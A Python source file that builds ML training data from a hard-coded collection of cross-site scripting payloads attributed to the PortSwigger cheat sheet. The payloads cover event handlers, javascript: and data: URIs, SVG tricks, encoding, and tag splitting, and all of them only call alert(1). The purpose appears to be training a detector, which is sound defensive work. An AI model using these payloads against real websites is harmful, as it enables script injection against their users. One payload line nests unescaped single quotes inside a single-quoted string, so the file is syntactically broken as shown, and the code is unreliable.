from typing import List, Dict, Any, Optional
import json
import os
import re
import logging
from datetime import datetime

class XSSCheatSheetTrainer:
    """
    XSS Cheat Sheet Trainer
    
    This class processes XSS cheat sheet data and prepares it for training the ML model.
    It extracts payloads, categorizes them, and adds metadata for better understanding.
    """
    
    def __init__(self, output_dir: str = "data/training"):
        """
        Initialize the XSS Cheat Sheet Trainer.
        
        Args:
            output_dir: Directory to save training data
        """
        self.logger = logging.getLogger("XSSCheatSheetTrainer")
        self.output_dir = output_dir
        self.payloads = []
        self.categories = {
            "html": [],
            "attr": [],
            "js": [],
            "url": [],
            "event": [],
            "svg": [],
            "iframe": [],
            "meta": [],
            "link": [],
            "embed": [],
            "object": [],
            "other": []
        }
        
        # Create output directory if it doesn't exist
        os.makedirs(output_dir, exist_ok=True)
    
    def add_payload(self, payload: str, category: str, description: str, 
                   browser_support: List[str] = None, context: str = None,
                   tags: List[str] = None, attributes: List[str] = None,
                   events: List[str] = None, techniques: List[str] = None):
        """
        Add a payload to the training data.
        
        Args:
            payload: The XSS payload
            category: Category of the payload
            description: Description of what the payload does
            browser_support: List of browsers that support this payload
            context: Context where the payload is effective
            tags: HTML tags used in the payload
            attributes: HTML attributes used in the payload
            events: Event handlers used in the payload
            techniques: Techniques used in the payload
        """
        if browser_support is None:
            browser_support = []
        if tags is None:
            tags = []
        if attributes is None:
            attributes = []
        if events is None:
            events = []
        if techniques is None:
            techniques = []
        
        # Extract context if not provided
        if context is None:
            context = self._detect_context(payload)
        
        # Extract tags if not provided
        if not tags:
            tags = self._extract_tags(payload)
        
        # Extract attributes if not provided
        if not attributes:
            attributes = self._extract_attributes(payload)
        
        # Extract events if not provided
        if not events:
            events = self._extract_events(payload)
        
        # Extract techniques if not provided
        if not techniques:
            techniques = self._extract_techniques(payload)
        
        # Create payload entry
        payload_entry = {
            "payload": payload,
            "category": category,
            "description": description,
            "browser_support": browser_support,
            "context": context,
            "tags": tags,
            "attributes": attributes,
            "events": events,
            "techniques": techniques,
            "added_date": datetime.now().isoformat()
        }
        
        # Add to payloads list
        self.payloads.append(payload_entry)
        
        # Add to category
        if category in self.categories:
            self.categories[category].append(payload_entry)
        else:
            self.categories["other"].append(payload_entry)
        
        self.logger.info(f"Added payload: {payload[:30]}...")
    
    def _detect_context(self, payload: str) -> str:
        """
        Detect the context of a payload.
        
        Args:
            payload: The XSS payload
            
        Returns:
            The detected context (html, attr, js, url)
        """
        # Check for JavaScript context
        js_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'eval\s*\(',
            r'document\.write\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\('
        ]
        
        for pattern in js_patterns:
            if re.search(pattern, payload, re.IGNORECASE | re.DOTALL):
                return 'js'
        
        # Check for attribute context
        attr_patterns = [
            r'"[^"]*"[^>]*>',
            r"'[^']*'[^>]*>",
            r'=\s*"[^"]*"',
            r"=\s*'[^']*'"
        ]
        
        for pattern in attr_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return 'attr'
        
        # Check for URL context
        url_patterns = [
            r'href\s*=',
            r'src\s*=',
            r'action\s*=',
            r'formaction\s*=',
            r'ping\s*='
        ]
        
        for pattern in url_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return 'url'
        
        # Default to HTML context
        return 'html'
    
    def _extract_tags(self, payload: str) -> List[str]:
        """
        Extract HTML tags from a payload.
        
        Args:
            payload: The XSS payload
            
        Returns:
            List of HTML tags
        """
        tags = []
        tag_pattern = r'<([a-zA-Z0-9]+)[^>]*>'
        matches = re.findall(tag_pattern, payload, re.IGNORECASE)
        
        for match in matches:
            tags.append(match.lower())
        
        return list(set(tags))
    
    def _extract_attributes(self, payload: str) -> List[str]:
        """
        Extract HTML attributes from a payload.
        
        Args:
            payload: The XSS payload
            
        Returns:
            List of HTML attributes
        """
        attributes = []
        attr_pattern = r'\s+([a-zA-Z0-9-]+)\s*='
        matches = re.findall(attr_pattern, payload, re.IGNORECASE)
        
        for match in matches:
            attributes.append(match.lower())
        
        return list(set(attributes))
    
    def _extract_events(self, payload: str) -> List[str]:
        """
        Extract event handlers from a payload.
        
        Args:
            payload: The XSS payload
            
        Returns:
            List of event handlers
        """
        events = []
        event_pattern = r'on([a-zA-Z0-9]+)\s*='
        matches = re.findall(event_pattern, payload, re.IGNORECASE)
        
        for match in matches:
            events.append(f"on{match.lower()}")
        
        return list(set(events))
    
    def _extract_techniques(self, payload: str) -> List[str]:
        """
        Extract techniques used in a payload.
        
        Args:
            payload: The XSS payload
            
        Returns:
            List of techniques
        """
        techniques = []
        
        # Check for encoding techniques
        if 'base64' in payload or 'btoa' in payload or 'atob' in payload:
            techniques.append('base64_encoding')
        
        if 'encodeURI' in payload or 'encodeURIComponent' in payload:
            techniques.append('url_encoding')
        
        if 'escape' in payload or 'unescape' in payload:
            techniques.append('escape_encoding')
        
        if '&#x' in payload or '&#' in payload:
            techniques.append('html_entity_encoding')
        
        if '\\u' in payload or '\\x' in payload:
            techniques.append('unicode_encoding')
        
        # Check for DOM manipulation
        if 'innerHTML' in payload or 'outerHTML' in payload:
            techniques.append('dom_manipulation')
        
        if 'document.write' in payload:
            techniques.append('document_write')
        
        if 'eval' in payload:
            techniques.append('eval')
        
        # Check for data exfiltration
        if 'fetch' in payload or 'XMLHttpRequest' in payload:
            techniques.append('data_exfiltration')
        
        if 'localStorage' in payload or 'sessionStorage' in payload:
            techniques.append('storage_access')
        
        # Check for protocol handlers
        if 'javascript:' in payload:
            techniques.append('javascript_protocol')
        
        if 'data:' in payload:
            techniques.append('data_protocol')
        
        if 'vbscript:' in payload:
            techniques.append('vbscript_protocol')
        
        # Check for tag splitting
        if '<scr' in payload and 'ipt' in payload and not '<script' in payload:
            techniques.append('tag_splitting')
        
        # Check for attribute splitting
        if 'onerror' in payload and '=' in payload and not 'onerror=' in payload:
            techniques.append('attribute_splitting')
        
        return techniques
    
    def load_portswigger_cheatsheet(self) -> None:
        """
        Load payloads from the PortSwigger XSS cheat sheet.
        """
        # HTML context payloads
        self.add_payload(
            payload='<img src=1 onerror=alert(1)>',
            category='html',
            description='Basic image tag with onerror event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['img'],
            attributes=['src'],
            events=['onerror'],
            techniques=['event_handler']
        )
        
        self.add_payload(
            payload='<svg/onload=alert(1)>',
            category='html',
            description='SVG tag with onload event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['svg'],
            events=['onload'],
            techniques=['event_handler']
        )
        
        self.add_payload(
            payload='<body onload=alert(1)>',
            category='html',
            description='Body tag with onload event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['body'],
            events=['onload'],
            techniques=['event_handler']
        )
        
        # Attribute context payloads
        self.add_payload(
            payload='" onmouseover="alert(1)',
            category='attr',
            description='Attribute value with onmouseover event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='attr',
            events=['onmouseover'],
            techniques=['attribute_injection']
        )
        
        self.add_payload(
            payload='\' onmouseover=\'alert(1)',
            category='attr',
            description='Attribute value with onmouseover event handler (single quotes)',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='attr',
            events=['onmouseover'],
            techniques=['attribute_injection']
        )
        
        # JavaScript context payloads
        self.add_payload(
            payload='</script><script>alert(1)</script>',
            category='js',
            description='Script tag injection',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='js',
            tags=['script'],
            techniques=['tag_injection']
        )
        
        self.add_payload(
            payload='";alert(1);//',
            category='js',
            description='JavaScript string termination',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='js',
            techniques=['string_termination']
        )
        
        self.add_payload(
            payload='\';alert(1);//',
            category='js',
            description='JavaScript string termination (single quotes)',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='js',
            techniques=['string_termination']
        )
        
        # URL context payloads
        self.add_payload(
            payload='javascript:alert(1)',
            category='url',
            description='JavaScript protocol handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='url',
            techniques=['javascript_protocol']
        )
        
        self.add_payload(
            payload='data:text/html,<script>alert(1)</script>',
            category='url',
            description='Data URI with HTML content',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='url',
            techniques=['data_protocol']
        )
        
        # Event handler payloads
        self.add_payload(
            payload='onclick=alert(1)',
            category='event',
            description='Click event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='attr',
            events=['onclick'],
            techniques=['event_handler']
        )
        
        self.add_payload(
            payload='onmouseover=alert(1)',
            category='event',
            description='Mouseover event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='attr',
            events=['onmouseover'],
            techniques=['event_handler']
        )
        
        # SVG payloads
        self.add_payload(
            payload='<svg><script>alert(1)</script></svg>',
            category='svg',
            description='SVG with embedded script',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['svg', 'script'],
            techniques=['svg_injection']
        )
        
        self.add_payload(
            payload='<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            category='svg',
            description='SVG animate with onbegin event',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['svg', 'animate'],
            events=['onbegin'],
            techniques=['svg_animation']
        )
        
        # Iframe payloads
        self.add_payload(
            payload='<iframe src="javascript:alert(1)">',
            category='iframe',
            description='Iframe with JavaScript protocol',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['iframe'],
            attributes=['src'],
            techniques=['javascript_protocol']
        )
        
        # Meta payloads
        self.add_payload(
            payload='<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            category='meta',
            description='Meta refresh with JavaScript protocol',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['meta'],
            attributes=['http-equiv', 'content'],
            techniques=['meta_refresh', 'javascript_protocol']
        )
        
        # Link payloads
        self.add_payload(
            payload='<link rel="import" href="javascript:alert(1)">',
            category='link',
            description='Link with JavaScript protocol',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['link'],
            attributes=['rel', 'href'],
            techniques=['javascript_protocol']
        )
        
        # Embed payloads
        self.add_payload(
            payload='<embed src="javascript:alert(1)">',
            category='embed',
            description='Embed with JavaScript protocol',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['embed'],
            attributes=['src'],
            techniques=['javascript_protocol']
        )
        
        # Object payloads
        self.add_payload(
            payload='<object data="javascript:alert(1)">',
            category='object',
            description='Object with JavaScript protocol',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['object'],
            attributes=['data'],
            techniques=['javascript_protocol']
        )
        
        # Advanced payloads
        self.add_payload(
            payload='<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
            category='html',
            description='HTML entity encoding in event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['img'],
            attributes=['src'],
            events=['onerror'],
            techniques=['html_entity_encoding', 'event_handler']
        )
        
        self.add_payload(
            payload='<img src=x onerror="eval(atob('YWxlcnQoMSk='))">',
            category='html',
            description='Base64 encoding in event handler',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['img'],
            attributes=['src'],
            events=['onerror'],
            techniques=['base64_encoding', 'eval', 'event_handler']
        )
        
        self.add_payload(
            payload='<scr<script>ipt>alert(1)</scr</script>ipt>',
            category='html',
            description='Tag splitting technique',
            browser_support=['Chrome', 'Firefox', 'Safari', 'Edge'],
            context='html',
            tags=['script'],
            techniques=['tag_splitting']
        )
        
        self.add_payload(
            payload='<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>',
            category='svg',
            description='SVG use element with base64 encoded content',
            browser_support=['Chrome', 'Firefox'],
            context='html',
            tags=['svg', 'use'],
            attributes=['href'],
            techniques=['svg_use', 'base64_encoding']
        )
        
        self.add_payload(
            payload='<svg><discard onbegin=alert(1)></svg>',
            category='svg',
            description='SVG discard element with onbegin event',
            browser_support=['Chrome'],
            context='html',
            tags=['svg', 'discard'],
            events=['onbegin'],
            techniques=['svg_animation']
        )
        
        self.add_payload(
            payload='<marquee onstart=alert(1)>XSS</marquee>',
            category='html',
            description='Marquee element with onstart event',
            browser_support=['Firefox'],
            context='html',
            tags=['marquee'],
            events=['onstart'],
            techniques=['event_handler']
        )
        
        self.add_payload(
            payload='<script>location.protocol=\'javascript\'</script>',
            category='js',
            description='Protocol assignment in JavaScript',
            browser_support=['Chrome', 'Safari'],
            context='js',
            tags=['script'],
            techniques=['protocol_assignment']
        )
        
        self.add_payload(
            payload='<a href="%0aalert(1)" onclick="protocol=\'javascript\'">test</a>',
            category='url',
            description='Protocol assignment with newline in URL',
            browser_support=['Chrome', 'Safari'],
            context='html',
            tags=['a'],
            attributes=['href', 'onclick'],
            events=['onclick'],
            techniques=['protocol_assignment', 'url_encoding']
        )
        
        self.add_payload(
            payload='<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>',
            category='url',
            description='Base tag with JavaScript protocol rewriting relative URLs',
            browser_support=['Safari'],
            context='html',
            tags=['base', 'a'],
            attributes=['href'],
            techniques=['base_tag', 'javascript_protocol']
        )
        
        self.logger.info(f"Loaded {len(self.payloads)} payloads from PortSwigger XSS cheat sheet")
    
    def generate_training_data(self) -> Dict[str, Any]:
        """
        Generate training data for the ML model.
        
        Returns:
            Dictionary containing training data
        """
        training_data = {
            "payloads": self.payloads,
            "categories": self.categories,
            "metadata": {
                "total_payloads": len(self.payloads),
                "categories": list(self.categories.keys()),
                "generated_date": datetime.now().isoformat(),
                "source": "PortSwigger XSS Cheat Sheet"
            }
        }
        
        return training_data
    
    def save_training_data(self, filename: str = "xss_cheatsheet_training.json") -> str:
        """
        Save training data to a file.
        
        Args:
            filename: Name of the file to save
            
        Returns:
            Path to the saved file
        """
        training_data = self.generate_training_data()
        file_path = os.path.join(self.output_dir, filename)
        
        with open(file_path, 'w') as f:
            json.dump(training_data, f, indent=2)
        
        self.logger.info(f"Saved training data to {file_path}")
        
        return file_path
    
    def generate_ml_training_data(self) -> List[Dict[str, Any]]:
        """
        Generate data in the format expected by the ML model.
        
        Returns:
            List of dictionaries containing training data for the ML model
        """
        ml_training_data = []
        
        for payload_entry in self.payloads:
            # Create a sample for each payload
            sample = {
                "html_content": payload_entry["payload"],
                "context": payload_entry["context"],
                "is_vulnerable": 1,  # All cheat sheet payloads are vulnerable
                "category": payload_entry["category"],
                "description": payload_entry["description"],
                "browser_support": payload_entry["browser_support"],
                "tags": payload_entry["tags"],
                "attributes": payload_entry["attributes"],
                "events": payload_entry["events"],
                "techniques": payload_entry["techniques"]
            }
            
            ml_training_data.append(sample)
        
        return ml_training_data
    
    def save_ml_training_data(self, filename: str = "xss_ml_training.json") -> str:
        """
        Save ML training data to a file.
        
        Args:
            filename: Name of the file to save
            
        Returns:
            Path to the saved file
        """
        ml_training_data = self.generate_ml_training_data()
        file_path = os.path.join(self.output_dir, filename)
        
        with open(file_path, 'w') as f:
            json.dump(ml_training_data, f, indent=2)
        
        self.logger.info(f"Saved ML training data to {file_path}")
        
        return file_path
    
    def generate_payload_database(self, filename: str = "xss_payload_database.json") -> str:
        """
        Generate a database of payloads with metadata.
        
        Args:
            filename: Name of the file to save
            
        Returns:
            Path to the saved file
        """
        payload_database = {
            "payloads": self.payloads,
            "categories": {category: len(payloads) for category, payloads in self.categories.items()},
            "metadata": {
                "total_payloads": len(self.payloads),
                "categories": list(self.categories.keys()),
                "generated_date": datetime.now().isoformat(),
                "source": "PortSwigger XSS Cheat Sheet"
            }
        }
        
        file_path = os.path.join(self.output_dir, filename)
        
        with open(file_path, 'w') as f:
            json.dump(payload_database, f, indent=2)
        
        self.logger.info(f"Saved payload database to {file_path}")
        
        return file_path 